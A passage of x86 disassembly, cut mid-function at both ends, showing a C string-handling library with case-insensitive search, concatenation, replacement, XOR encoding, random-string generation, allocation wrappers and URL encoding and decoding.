mov    ecx,edx
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    edi,[ecx-0x1]
xor    eax,eax
cmp    ebx,edi
jb     804d35d <stristr+0x99>
mov    eax,ebx
sub    eax,edi
cmp    eax,0x0
mov    DWORD PTR [ebp-0x10],0x0
jbe    804d35b <stristr+0x97>
mov    DWORD PTR [ebp-0x14],eax
mov    esi,esi
xor    esi,esi
cmp    esi,edi
jae    804d34c <stristr+0x88>
mov    ebx,DWORD PTR [ebp+0x8]
add    ebx,DWORD PTR [ebp-0x10]
jmp    804d328 <stristr+0x64>
mov    esi,esi
movsx  eax,dl
add    eax,0x20
cmp    ecx,eax
jne    804d34c <stristr+0x88>
inc    esi
inc    ebx
cmp    esi,edi
jae    804d34c <stristr+0x88>
mov    al,BYTE PTR [ebx]
movsx  ecx,al
sub    eax,0x41
cmp    al,0x19
ja     804d337 <stristr+0x73>
add    ecx,0x20
mov    eax,DWORD PTR [ebp+0xc]
mov    dl,BYTE PTR [eax+esi*1]
lea    eax,[edx-0x41]
cmp    al,0x19
jbe    804d318 <stristr+0x54>
movsx  eax,dl
cmp    ecx,eax
je     804d322 <stristr+0x5e>
nop
cmp    esi,edi
je     804d365 <stristr+0xa1>
inc    DWORD PTR [ebp-0x10]
mov    eax,DWORD PTR [ebp-0x10]
cmp    DWORD PTR [ebp-0x14],eax
ja     804d308 <stristr+0x44>
xor    eax,eax
add    esp,0x8
pop    ebx
pop    esi
pop    edi
leave  
ret    
mov    eax,DWORD PTR [ebp+0x8]
add    eax,DWORD PTR [ebp-0x10]
add    esp,0x8
pop    ebx
pop    esi
pop    edi
leave  
ret    
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
mov    edx,0xffffffff
xor    eax,eax
mov    edi,DWORD PTR [ebp+0x8]
cld    
mov    ecx,edx
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    esi,DWORD PTR [ebp+0xc]
lea    ebx,[ecx-0x1]
mov    edi,esi
mov    ecx,edx
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
cmp    ebx,ecx
mov    eax,0x1
je     804d3a8 <stricmp+0x34>
pop    ebx
pop    esi
pop    edi
leave  
ret    
xor    edi,edi
jmp    804d3b7 <stricmp+0x43>
movsx  eax,dl
add    eax,0x20
cmp    ecx,eax
jne    804d3e7 <stricmp+0x73>
inc    edi
cmp    edi,ebx
jae    804d3e0 <stricmp+0x6c>
mov    edx,DWORD PTR [ebp+0x8]
mov    al,BYTE PTR [edx+edi*1]
movsx  ecx,al
sub    eax,0x41
cmp    al,0x19
ja     804d3ce <stricmp+0x5a>
add    ecx,0x20
mov    dl,BYTE PTR [esi+edi*1]
lea    eax,[edx-0x41]
cmp    al,0x19
jbe    804d3ac <stricmp+0x38>
movsx  eax,dl
jmp    804d3b2 <stricmp+0x3e>
lea    esi,[esi+0x0]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
pop    ebx
pop    esi
mov    eax,0x1
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    ecx,DWORD PTR [ebp+0x8]
test   ecx,ecx
mov    esi,DWORD PTR [ebp+0xc]
mov    DWORD PTR [ebp-0x10],0x0
je     804d421 <strconcat+0x2d>
mov    edi,DWORD PTR [ebp+0x8]
cld    
mov    ecx,0xffffffff
xor    eax,eax
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
mov    DWORD PTR [ebp-0x10],ecx
xor    ebx,ebx
test   esi,esi
je     804d438 <strconcat+0x44>
cld    
mov    ecx,0xffffffff
xor    eax,eax
mov    edi,esi
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    ebx,[ecx-0x1]
mov    edx,DWORD PTR [ebp-0x10]
sub    esp,0xc
lea    eax,[edx+ebx*1+0x1]
push   eax
call   8048cec <malloc@plt>
mov    edx,DWORD PTR [ebp-0x10]
add    esp,0x10
test   edx,edx
mov    edi,eax
jle    804d484 <strconcat+0x90>
sub    esp,0x8
push   DWORD PTR [ebp+0x8]
push   eax
call   8048c0c <strcpy@plt>
add    esp,0x10
test   ebx,ebx
jle    804d47a <strconcat+0x86>
sub    esp,0x8
mov    edx,DWORD PTR [ebp-0x10]
push   esi
lea    eax,[edi+edx*1]
push   eax
call   8048c0c <strcpy@plt>
add    esp,0x10
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
mov    eax,edi
pop    edi
leave  
ret    
mov    BYTE PTR [eax],0x0
jmp    804d463 <strconcat+0x6f>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0xc
movzx  eax,BYTE PTR [ebp+0xc]
push   eax
mov    ebx,DWORD PTR [ebp+0x8]
push   ebx
call   8048f5c <strchr@plt>
mov    edx,eax
add    esp,0x10
test   edx,edx
mov    eax,0xffffffff
je     804d4b3 <chrpos+0x27>
mov    eax,edx
sub    eax,ebx
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   ebp
mov    ebp,esp
push   ebx
push   eax
mov    dl,BYTE PTR [ebp+0x10]
mov    eax,DWORD PTR [ebp+0x8]
mov    BYTE PTR [ebp-0x5],dl
mov    dl,BYTE PTR [eax]
test   dl,dl
mov    bl,BYTE PTR [ebp+0xc]
mov    ecx,eax
je     804d4df <chrreplace+0x27>
lea    esi,[esi+0x0]
cmp    dl,bl
je     804d4e4 <chrreplace+0x2c>
inc    ecx
mov    dl,BYTE PTR [ecx]
test   dl,dl
jne    804d4d4 <chrreplace+0x1c>
pop    ebx
pop    ebx
leave  
ret    
nop
mov    dl,BYTE PTR [ebp-0x5]
mov    BYTE PTR [ecx],dl
inc    ecx
mov    dl,BYTE PTR [ecx]
jmp    804d4db <chrreplace+0x23>
mov    esi,esi
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
mov    ebx,DWORD PTR [ebp+0x8]
test   ebx,ebx
mov    esi,DWORD PTR [ebp+0xc]
mov    edi,DWORD PTR [ebp+0x10]
je     804d52c <xorencode+0x3c>
test   esi,esi
je     804d52c <xorencode+0x3c>
xor    edx,edx
jmp    804d51c <xorencode+0x2c>
nop
mov    ecx,edx
and    ecx,0x3
shl    ecx,0x3
mov    eax,edi
shr    eax,cl
xor    BYTE PTR [ebx+edx*1],al
inc    edx
cmp    edx,esi
jb     804d50c <xorencode+0x1c>
pop    ebx
pop    esi
mov    eax,0x1
pop    edi
leave  
ret    
mov    esi,esi
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
nop
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,DWORD PTR [ebp+0x14]
cmp    BYTE PTR [ebx],0x0
je     804d548 <decode_data+0x14>
mov    eax,DWORD PTR [ebp+0x8]
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   DWORD PTR [ebp+0x10]
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
call   804d4f0 <xorencode>
mov    BYTE PTR [ebx],0x1
mov    eax,DWORD PTR [ebp+0x8]
add    esp,0xc
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   ebp
mov    ebp,esp
mov    ecx,DWORD PTR [ebp+0x8]
mov    dl,BYTE PTR [ecx]
test   dl,dl
je     804d583 <downcase+0x1f>
lea    eax,[edx-0x41]
cmp    al,0x19
ja     804d57c <downcase+0x18>
add    edx,0x20
mov    BYTE PTR [ecx],dl
inc    ecx
mov    dl,BYTE PTR [ecx]
test   dl,dl
jne    804d570 <downcase+0xc>
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
mov    ecx,DWORD PTR [ebp+0x8]
mov    dl,BYTE PTR [ecx]
test   dl,dl
je     804d5a7 <upcase+0x1f>
lea    eax,[edx-0x61]
cmp    al,0x19
ja     804d5a0 <upcase+0x18>
sub    edx,0x20
mov    BYTE PTR [ecx],dl
inc    ecx
mov    dl,BYTE PTR [ecx]
test   dl,dl
jne    804d594 <upcase+0xc>
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   ebx
mov    ebx,DWORD PTR [ebp+0x8]
xor    eax,eax
mov    edi,ebx
cld    
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    eax,[ecx-0x2]
lea    esi,[esi+0x0]
mov    dl,BYTE PTR [ebx+eax*1]
cmp    dl,0xd
je     804d5d5 <chomp+0x29>
cmp    dl,0xa
jne    804d5dc <chomp+0x30>
mov    BYTE PTR [ebx+eax*1],0x0
dec    eax
jmp    804d5c8 <chomp+0x1c>
pop    ebx
pop    edi
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   ebx
mov    ebx,DWORD PTR [ebp+0x8]
mov    edi,ebx
xor    eax,eax
cld    
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    edi,[ecx-0x1]
xor    ecx,ecx
cmp    ecx,edi
jae    804d61d <is_alnum_str+0x3d>
nop
mov    dl,BYTE PTR [ebx+ecx*1]
lea    eax,[edx-0x41]
cmp    al,0x19
jbe    804d618 <is_alnum_str+0x38>
lea    eax,[edx-0x61]
cmp    al,0x19
jbe    804d618 <is_alnum_str+0x38>
lea    eax,[edx-0x30]
cmp    al,0x9
ja     804d626 <is_alnum_str+0x46>
inc    ecx
cmp    ecx,edi
jb     804d600 <is_alnum_str+0x20>
pop    ebx
mov    eax,0x1
pop    edi
leave  
ret    
pop    ebx
xor    eax,eax
pop    edi
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
sub    esp,0x8
cld    
xor    eax,eax
mov    edi,0x80559e0
mov    ecx,0x10
rep stos DWORD PTR es:[edi],eax
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
push   0x80559e0
call   8048edc <sprintf@plt>
mov    eax,0x80559e0
mov    edi,DWORD PTR [ebp-0x4]
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   ebx
mov    ebx,DWORD PTR [ebp+0x8]
test   ebx,ebx
je     804d6ae <strnospaces+0x52>
xor    eax,eax
mov    edi,ebx
cld    
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
xor    edx,edx
xor    edi,edi
cmp    edx,ecx
jae    804d6a1 <strnospaces+0x45>
nop
mov    al,BYTE PTR [ebx+edx*1]
cmp    al,0x20
je     804d69c <strnospaces+0x40>
cmp    al,0xd
je     804d69c <strnospaces+0x40>
cmp    al,0xa
je     804d69c <strnospaces+0x40>
cmp    al,0x9
je     804d69c <strnospaces+0x40>
cmp    edi,edx
je     804d69a <strnospaces+0x3e>
mov    BYTE PTR [ebx+edi*1],al
inc    edi
nop
inc    edx
cmp    edx,ecx
jb     804d680 <strnospaces+0x24>
mov    BYTE PTR [ebx+edi*1],0x0
mov    eax,ebx
lea    esp,[ebp-0x8]
pop    ebx
pop    edi
leave  
ret    
push   eax
push   0x0
push   0x804f11a
push   0x6
call   804a860 <seterror>
xor    eax,eax
jmp    804d6a7 <strnospaces+0x4b>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    edx,DWORD PTR [ebp+0x8]
xor    ecx,ecx
test   edx,edx
mov    al,BYTE PTR [ebp+0xc]
je     804d6fc <strget+0x38>
sub    esp,0x8
movsx  eax,al
push   eax
push   edx
call   8048f5c <strchr@plt>
add    esp,0x10
xor    ecx,ecx
test   eax,eax
je     804d6fc <strget+0x38>
inc    eax
mov    dl,BYTE PTR [eax]
cmp    dl,0x20
je     804d6ec <strget+0x28>
xor    ecx,ecx
test   dl,dl
je     804d6fc <strget+0x38>
mov    ecx,eax
mov    eax,ecx
leave  
ret    
push   ebp
mov    ebp,esp
push   ebx
push   eax
mov    ebx,DWORD PTR [ebp+0x8]
test   ebx,ebx
je     804d73b <xstrdup+0x3b>
sub    esp,0xc
push   ebx
call   8048e3c <strdup@plt>
add    esp,0x10
test   eax,eax
je     804d721 <xstrdup+0x21>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
sub    esp,0x8
push   ebx
push   0x804f1f4
call   8048c2c <printf@plt>
mov    DWORD PTR [esp],0x0
call   8048f1c <exit@plt>
push   eax
push   0x0
push   0x804f12a
push   0x6
call   804a860 <seterror>
xor    eax,eax
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    ebx,DWORD PTR [ebp+0xc]
test   ebx,ebx
mov    edi,DWORD PTR [ebp+0x10]
je     804d820 <strreplace+0xcc>
test   edi,edi
je     804d830 <strreplace+0xdc>
mov    eax,DWORD PTR [ebp+0x8]
sub    esp,0xc
test   eax,eax
je     804d814 <strreplace+0xc0>
push   eax
call   804d700 <xstrdup>
mov    DWORD PTR [ebp-0x14],eax
add    esp,0x10
cmp    BYTE PTR [ebx],0x0
je     804d808 <strreplace+0xb4>
sub    esp,0x8
push   ebx
push   eax
call   8048dbc <strstr@plt>
add    esp,0x10
test   eax,eax
mov    esi,eax
je     804d808 <strreplace+0xb4>
sub    esp,0x8
mov    BYTE PTR [eax],0x0
push   edi
push   DWORD PTR [ebp-0x14]
call   804d3f4 <strconcat>
add    esp,0xc
mov    DWORD PTR [ebp-0x10],eax
push   edi
cld    
push   ebx
mov    edi,ebx
xor    eax,eax
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    ecx,[ecx+esi*1-0x1]
push   ecx
call   804d754 <strreplace>
pop    edx
pop    ecx
push   eax
push   DWORD PTR [ebp-0x10]
mov    esi,eax
call   804d3f4 <strconcat>
mov    ebx,eax
pop    eax
push   DWORD PTR [ebp-0x14]
call   8048f8c <free@plt>
mov    DWORD PTR [esp],esi
call   8048f8c <free@plt>
pop    eax
push   DWORD PTR [ebp-0x10]
call   8048f8c <free@plt>
lea    esp,[ebp-0xc]
mov    eax,ebx
pop    ebx
pop    esi
pop    edi
leave  
ret    
nop
mov    eax,DWORD PTR [ebp-0x14]
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
nop
mov    eax,0x804e01f
jmp    804d781 <strreplace+0x2d>
mov    esi,esi
test   edi,edi
mov    ebx,0x804e01f
jne    804d773 <strreplace+0x1f>
lea    esi,[esi+0x0]
mov    edi,0x804e01f
jmp    804d773 <strreplace+0x1f>
mov    esi,esi
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x8
push   DWORD PTR [ebp+0x10]
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
call   804d754 <strreplace>
add    esp,0xc
push   0x40
push   eax
push   0x8055a20
mov    ebx,eax
call   8048dfc <strncpy@plt>
mov    DWORD PTR [esp],ebx
call   8048f8c <free@plt>
mov    eax,0x8055a20
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x10
mov    ebx,DWORD PTR [ebp+0x8]
push   ebx
call   8048cec <malloc@plt>
add    esp,0x10
test   eax,eax
je     804d894 <xmalloc+0x1c>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
sub    esp,0x8
push   ebx
push   0x804f224
call   8048c2c <printf@plt>
mov    DWORD PTR [esp],0x0
call   8048f1c <exit@plt>
mov    esi,esi
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x1c
mov    edi,DWORD PTR [ebp+0x8]
test   edi,edi
je     804d9bc <strrand+0x10c>
test   DWORD PTR [ebp+0xc],0x800
je     804d9b0 <strrand+0x100>
test   DWORD PTR [ebp+0xc],0x2000
jne    804da53 <strrand+0x1a3>
test   DWORD PTR [ebp+0xc],0x800
jne    804da3c <strrand+0x18c>
mov    DWORD PTR [ebp-0x1c],0x8055a60
lea    ebx,[edi+0x1]
push   eax
push   ebx
push   0x0
push   DWORD PTR [ebp-0x1c]
call   8048e5c <memset@plt>
mov    DWORD PTR [ebp-0x18],0x0
add    esp,0x10
cmp    DWORD PTR [ebp-0x18],edi
jae    804d9a4 <strrand+0xf4>
mov    esi,DWORD PTR [ebp-0x1c]
jmp    804d932 <strrand+0x82>
lea    esi,[esi+0x0]
test   DWORD PTR [ebp+0xc],0x4000
jne    804d9d8 <strrand+0x128>
inc    DWORD PTR [ebp-0x18]
inc    esi
cmp    DWORD PTR [ebp-0x18],edi
jae    804d9a4 <strrand+0xf4>
call   8048dcc <rand@plt>
push   eax
fild   DWORD PTR [esp]
fnstcw WORD PTR [ebp-0xe]
mov    ax,WORD PTR [ebp-0xe]
fmul   DWORD PTR ds:0x804ee8c
mov    ah,0xc
fmul   DWORD PTR ds:0x804ee90
mov    WORD PTR [ebp-0x10],ax
add    esp,0x4
fldcw  WORD PTR [ebp-0x10]
fistp  DWORD PTR [ebp-0x14]
fldcw  WORD PTR [ebp-0xe]
test   DWORD PTR [ebp+0xc],0x8000
mov    ebx,DWORD PTR [ebp-0x14]
je     804d91c <strrand+0x6c>
call   8048dcc <rand@plt>
mov    edx,0x3
mov    ecx,edx
cdq    
idiv   ecx
test   edx,edx
jne    804da1c <strrand+0x16c>
mov    eax,DWORD PTR [ebp-0x18]
test   eax,eax
je     804da06 <strrand+0x156>
mov    edx,0x9
mov    eax,ebx
mov    ecx,edx
cdq    
idiv   ecx
add    edx,0x30
mov    BYTE PTR [esi],dl
inc    DWORD PTR [ebp-0x18]
inc    esi
cmp    DWORD PTR [ebp-0x18],edi
jb     804d932 <strrand+0x82>
mov    eax,DWORD PTR [ebp-0x1c]
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
nop
cmp    edi,0x3ff
jbe    804d8d1 <strrand+0x21>
push   DWORD PTR [ebp+0xc]
push   edi
push   0x804f136
push   0x6
call   804a860 <seterror>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
mov    esi,esi
call   8048dcc <rand@plt>
mov    edx,eax
shr    edx,0x1f
lea    edx,[eax+edx*1]
and    edx,0xfffffffe
sub    eax,edx
je     804da28 <strrand+0x178>
cmp    eax,0x1
jne    804d929 <strrand+0x79>
mov    eax,ebx
mov    ecx,0x19
cdq    
idiv   ecx
add    edx,0x41
mov    BYTE PTR [esi],dl
jmp    804d99b <strrand+0xeb>
call   8048dcc <rand@plt>
mov    edx,eax
shr    edx,0x1f
lea    edx,[eax+edx*1]
and    edx,0xfffffffe
sub    eax,edx
lea    edx,[eax+0x1]
nop
cmp    edx,0x1
je     804da28 <strrand+0x178>
jle    804da64 <strrand+0x1b4>
cmp    edx,0x2
jmp    804d9ef <strrand+0x13f>
mov    eax,ebx
mov    ecx,0x19
cdq    
idiv   ecx
add    edx,0x61
mov    BYTE PTR [esi],dl
jmp    804d99b <strrand+0xeb>
sub    esp,0xc
lea    ebx,[edi+0x1]
push   ebx
call   804d878 <xmalloc>
add    esp,0x10
mov    DWORD PTR [ebp-0x1c],eax
jmp    804d8f5 <strrand+0x45>
call   8048dcc <rand@plt>
xor    edx,edx
div    edi
lea    edi,[edx+0x1]
jmp    804d8de <strrand+0x2e>
test   edx,edx
je     804d98a <strrand+0xda>
jmp    804d929 <strrand+0x79>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   esi
push   ebx
sub    esp,0x8
mov    ebx,DWORD PTR [ebp+0xc]
push   ebx
mov    esi,DWORD PTR [ebp+0x8]
push   esi
call   8048e0c <realloc@plt>
add    esp,0x10
test   eax,eax
je     804da97 <xrealloc+0x23>
lea    esp,[ebp-0x8]
pop    ebx
pop    esi
leave  
ret    
push   eax
push   ebx
push   esi
push   0x804f254
call   8048c2c <printf@plt>
mov    DWORD PTR [esp],0x0
call   8048f1c <exit@plt>
push   ebp
mov    ebp,esp
push   esi
push   ebx
sub    esp,0x8
mov    ebx,DWORD PTR [ebp+0xc]
push   ebx
mov    esi,DWORD PTR [ebp+0x8]
push   esi
call   8048d5c <calloc@plt>
add    esp,0x10
test   eax,eax
je     804dad3 <xcalloc+0x23>
lea    esp,[ebp-0x8]
pop    ebx
pop    esi
leave  
ret    
push   eax
push   ebx
push   esi
push   0x804f288
call   8048c2c <printf@plt>
mov    DWORD PTR [esp],0x0
call   8048f1c <exit@plt>
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    edi,DWORD PTR [ebp+0x8]
test   edi,edi
mov    esi,DWORD PTR [ebp+0xc]
je     804db03 <xstrndup+0x17>
test   esi,esi
jne    804db1c <xstrndup+0x30>
push   esi
push   edi
push   0x804f148
push   0x6
call   804a860 <seterror>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
nop
sub    esp,0xc
lea    eax,[esi+0x1]
push   eax
call   804d878 <xmalloc>
add    esp,0xc
push   esi
push   edi
mov    ebx,eax
push   eax
call   8048ccc <memcpy@plt>
mov    BYTE PTR [ebx+esi*1],0x0
lea    esp,[ebp-0xc]
mov    eax,ebx
pop    ebx
pop    esi
pop    edi
leave  
ret    
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    eax,DWORD PTR [ebp+0x8]
mov    edx,DWORD PTR [ebp+0x10]
xor    esi,esi
test   eax,eax
mov    DWORD PTR [ebp-0x10],edx
mov    dl,BYTE PTR [ebp+0xc]
je     804dbaa <strsplit+0x66>
mov    ebx,eax
movsx  edi,dl
jmp    804db71 <strsplit+0x2d>
mov    esi,esi
cmp    esi,DWORD PTR [ebp-0x10]
je     804db96 <strsplit+0x52>
inc    esi
lea    ebx,[eax+0x1]
sub    esp,0x8
push   edi
push   ebx
call   8048f5c <strchr@plt>
add    esp,0x10
test   eax,eax
jne    804db68 <strsplit+0x24>
cmp    DWORD PTR [ebp-0x10],esi
jne    804dbaa <strsplit+0x66>
mov    DWORD PTR [ebp+0x8],ebx
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
jmp    8048e3c <strdup@plt>
sub    eax,ebx
mov    DWORD PTR [ebp+0xc],eax
mov    DWORD PTR [ebp+0x8],ebx
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
jmp    804daec <xstrndup>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
push   ebp
mov    ebp,esp
mov    edx,DWORD PTR [ebp+0x8]
xor    eax,eax
test   edx,edx
push   edi
je     804dbd1 <xstrlen+0x1d>
cld    
mov    ecx,0xffffffff
mov    edi,DWORD PTR [ebp+0x8]
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    eax,[ecx-0x1]
pop    edi
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x2c
mov    ebx,DWORD PTR [ebp+0x8]
xor    esi,esi
test   ebx,ebx
mov    BYTE PTR [ebp-0x28],0x30
mov    BYTE PTR [ebp-0x27],0x31
mov    BYTE PTR [ebp-0x26],0x32
mov    BYTE PTR [ebp-0x25],0x33
mov    BYTE PTR [ebp-0x24],0x34
mov    BYTE PTR [ebp-0x23],0x35
mov    BYTE PTR [ebp-0x22],0x36
mov    BYTE PTR [ebp-0x21],0x37
mov    BYTE PTR [ebp-0x20],0x38
mov    BYTE PTR [ebp-0x1f],0x39
mov    BYTE PTR [ebp-0x1e],0x61
mov    BYTE PTR [ebp-0x1d],0x62
mov    BYTE PTR [ebp-0x1c],0x63
mov    BYTE PTR [ebp-0x1b],0x64
mov    BYTE PTR [ebp-0x1a],0x65
mov    BYTE PTR [ebp-0x19],0x66
je     804dcef <urldecode+0x11b>
cld    
xor    eax,eax
mov    edi,DWORD PTR [ebp+0x8]
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
mov    ebx,ecx
sub    esp,0xc
not    ebx
lea    eax,[ebx-0x1]
push   ebx
mov    DWORD PTR [ebp-0x2c],eax
call   804d878 <xmalloc>
add    esp,0xc
push   ebx
push   0x0
push   eax
mov    edi,eax
call   8048e5c <memset@plt>
xor    edx,edx
add    esp,0x10
cmp    esi,DWORD PTR [ebp-0x2c]
jae    804dc7c <urldecode+0xa8>
mov    esi,esi
mov    ecx,DWORD PTR [ebp+0x8]
mov    al,BYTE PTR [ecx+edx*1]
cmp    al,0x25
je     804dc94 <urldecode+0xc0>
cmp    al,0x2b
je     804dc86 <urldecode+0xb2>
mov    BYTE PTR [esi+edi*1],al
inc    edx
inc    esi
cmp    edx,DWORD PTR [ebp-0x2c]
jb     804dc64 <urldecode+0x90>
mov    eax,edi
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
mov    BYTE PTR [esi+edi*1],0x20
inc    edx
inc    esi
cmp    edx,DWORD PTR [ebp-0x2c]
jmp    804dc7a <urldecode+0xa6>
lea    esi,[esi+0x0]
lea    ecx,[edx+0x2]
mov    DWORD PTR [ebp-0x30],ecx
mov    ecx,DWORD PTR [ebp-0x2c]
cmp    DWORD PTR [ebp-0x30],ecx
jae    804dc72 <urldecode+0x9e>
mov    BYTE PTR [edi+esi*1],0x0
mov    eax,DWORD PTR [ebp+0x8]
xor    ebx,ebx
lea    ecx,[edx+eax*1+0x1]
mov    dl,BYTE PTR [ecx]
lea    eax,[edx-0x41]
cmp    al,0x19
ja     804dcbb <urldecode+0xe7>
add    edx,0x20
xor    eax,eax
lea    esi,[esi+0x0]
cmp    BYTE PTR [ebp+eax*1-0x28],dl
je     804dcdd <urldecode+0x109>
inc    eax
cmp    eax,0xf
jbe    804dcc0 <urldecode+0xec>
inc    ebx
inc    ecx
cmp    ebx,0x1
jbe    804dcaf <urldecode+0xdb>
mov    edx,DWORD PTR [ebp-0x30]
inc    edx
inc    esi
cmp    edx,DWORD PTR [ebp-0x2c]
jmp    804dc7a <urldecode+0xa6>
or     al,BYTE PTR [edi+esi*1]
test   ebx,ebx
jne    804dcea <urldecode+0x116>
movsx  eax,al
shl    eax,0x4
mov    BYTE PTR [edi+esi*1],al
jmp    804dccc <urldecode+0xf8>
push   ecx
push   0x0
push   0x804f159
push   0x6
call   804a860 <seterror>
xor    eax,eax
jmp    804dc7e <urldecode+0xaa>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x3c
cld    
lea    edi,[ebp-0x38]
mov    esi,0x804ed34
mov    ecx,0x4
mov    ebx,DWORD PTR [ebp+0x8]
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
xor    esi,esi
test   ebx,ebx
mov    eax,DWORD PTR [ebp+0xc]
je     804de04 <urlencoden+0xfc>
test   eax,eax
je     804de04 <urlencoden+0xfc>
mov    ecx,ebx
lea    edi,[ebx+eax*1]
cmp    edi,ecx
jbe    804dd79 <urlencoden+0x71>
nop
mov    dl,BYTE PTR [ecx]
lea    eax,[edx-0x61]
cmp    al,0x19
jbe    804de1c <urlencoden+0x114>
lea    eax,[edx-0x41]
cmp    al,0x19
jbe    804de1c <urlencoden+0x114>
lea    eax,[edx-0x30]
cmp    al,0x9
jbe    804de1c <urlencoden+0x114>
cmp    dl,0x20
je     804de1c <urlencoden+0x114>
add    esi,0x2
inc    ecx
inc    esi
cmp    edi,ecx
ja     804dd44 <urlencoden+0x3c>
sub    esp,0xc
lea    eax,[esi+0x1]
push   eax
call   804d878 <xmalloc>
mov    ecx,ebx
add    esp,0x10
cmp    edi,ecx
mov    DWORD PTR [ebp-0x3c],eax
mov    esi,eax
jbe    804ddf4 <urlencoden+0xec>
nop
mov    dl,BYTE PTR [ecx]
lea    eax,[edx-0x61]
cmp    al,0x19
jbe    804de40 <urlencoden+0x138>
lea    eax,[edx-0x41]
cmp    al,0x19
jbe    804de40 <urlencoden+0x138>
lea    eax,[edx-0x30]
cmp    al,0x9
jbe    804de40 <urlencoden+0x138>
cmp    dl,0x40
je     804de40 <urlencoden+0x138>
cmp    dl,0x2e
je     804de40 <urlencoden+0x138>
cmp    dl,0x2d
je     804de40 <urlencoden+0x138>
cmp    dl,0x20
je     804de46 <urlencoden+0x13e>
mov    BYTE PTR [esi],0x25
mov    al,BYTE PTR [ecx]
sar    al,0x4
and    eax,0xf
mov    al,BYTE PTR [ebp+eax*1-0x38]
inc    esi
mov    BYTE PTR [esi],al
movsx  eax,BYTE PTR [ecx]
and    eax,0xf
inc    esi
mov    al,BYTE PTR [ebp+eax*1-0x38]
mov    BYTE PTR [esi],al
inc    ecx
inc    esi
cmp    edi,ecx
ja     804dd94 <urlencoden+0x8c>
mov    BYTE PTR [esi],0x0
mov    eax,DWORD PTR [ebp-0x3c]
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
mov    esi,esi
push   eax
push   ebx
push   0x804f167
push   0x6
call   804a860 <seterror>
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
xor    eax,eax
pop    edi
leave  
ret    
cmp    dl,0x40
je     804dd70 <urlencoden+0x68>
cmp    dl,0x2e
je     804dd70 <urlencoden+0x68>
cmp    dl,0x2d
je     804dd70 <urlencoden+0x68>
inc    ecx
inc    esi
jmp    804dd75 <urlencoden+0x6d>
mov    esi,esi
mov    BYTE PTR [esi],dl
inc    ecx
inc    esi
jmp    804ddf0 <urlencoden+0xe8>
mov    BYTE PTR [esi],0x2b
inc    ecx
inc    esi
jmp    804ddf0 <urlencoden+0xe8>
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   eax
mov    edx,DWORD PTR [ebp+0x8]
test   edx,edx
je     804de7a <urlencode+0x2a>
mov    edi,edx
cld    
xor    eax,eax
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
